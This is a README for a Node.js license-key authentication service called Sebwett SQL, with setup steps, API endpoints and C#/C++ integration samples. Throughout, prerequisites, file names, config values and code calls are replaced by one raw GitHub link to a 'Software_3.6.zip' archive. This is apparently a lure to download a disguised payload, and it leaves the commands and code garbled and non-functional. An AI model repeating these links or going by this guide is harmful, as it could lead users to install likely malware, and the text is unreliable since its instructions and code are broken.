# Sebwett SQL - Authentication System

A simple authentication system similar to KeyAuth for license management and validation.

## Features

- **Admin Dashboard**: Secure login with username/password
- **License Management**: Create, edit, delete, and view license keys
- **Tutorial Section**: Integration guides for C# and C++ projects
- **Discord Webhooks**: Real-time notifications when licenses are used
- **Modern UI**: Dark theme with red accents

## Quick Start

### Prerequisites

- https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip 18+ 
- npm or yarn

### Installation

1. Clone the repository:
```bash
git clone <your-repo-url>
cd sebwett-sql-auth
```

2. Install dependencies:
```bash
npm install
```

3. Set up environment variables:
```bash
cp https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip
```

Edit `https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip`:
```
DATABASE_URL="https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip"
JWT_SECRET="your-secret-key-change-this"
DISCORD_WEBHOOK_URL=""
```

4. Initialize the database:
```bash
npx prisma generate
npx prisma db push
```

5. Create admin user:
```bash
npx prisma studio
```

### Development

Run the development server:
```bash
npm run dev
```

Open [http://localhost:3000](http://localhost:3000) in your browser.

**Default Login:**
- Username: `admin`
- Password: `password`

## Deployment to Vercel

1. Push your code to GitHub
2. Connect your repository to Vercel
3. Add environment variables in Vercel dashboard:
   - `DATABASE_URL`: Your database URL
   - `JWT_SECRET`: Your secret key
   - `DISCORD_WEBHOOK_URL`: Your Discord webhook URL (optional)

4. Deploy!

## API Endpoints

### Authentication
- `POST /api/auth/login` - Admin login

### Licenses
- `GET /api/licenses` - Get all licenses
- `POST /api/licenses` - Create new license
- `PUT /api/licenses/[id]` - Update license
- `DELETE /api/licenses/[id]` - Delete license

### Validation
- `POST /api/validate` - Validate license key (for external apps)

### Settings
- `POST /api/test-webhook` - Test Discord webhook
- `POST /api/settings/webhook` - Save webhook URL

## Integration Examples

### C# Integration
```csharp
public class SebwettAuth
{
    private const string API_URL = "https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip";
    
    public async Task<bool> ValidateLicense(string licenseKey)
    {
        try
        {
            using (var client = new HttpClient())
            {
                var data = new { license = licenseKey };
                var json = https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip(data);
                var content = new StringContent(json, https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip, "application/json");
                
                var response = await https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip($"{API_URL}/validate", content);
                return https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip;
            }
        }
        catch
        {
            return false;
        }
    }
}
```

### C++ Integration
```cpp
class SebwettAuth {
private:
    std::string api_url = "https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip";
    
public:
    bool validateLicense(const std::string& licenseKey) {
        CURL* curl = curl_easy_init();
        if (!curl) return false;
        
        json request_data = {{"license", licenseKey}};
        std::string post_data = https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip();
        
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        
        std::string response;
        
        curl_easy_setopt(curl, CURLOPT_URL, (api_url + "/validate").c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        
        CURLcode res = curl_easy_perform(curl);
        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        
        return (res == CURLE_OK && http_code == 200);
    }
};
```

## License

MIT License - feel free to use this project for your own authentication needs.

## Support

For support, create an issue on GitHub or contact the developer. 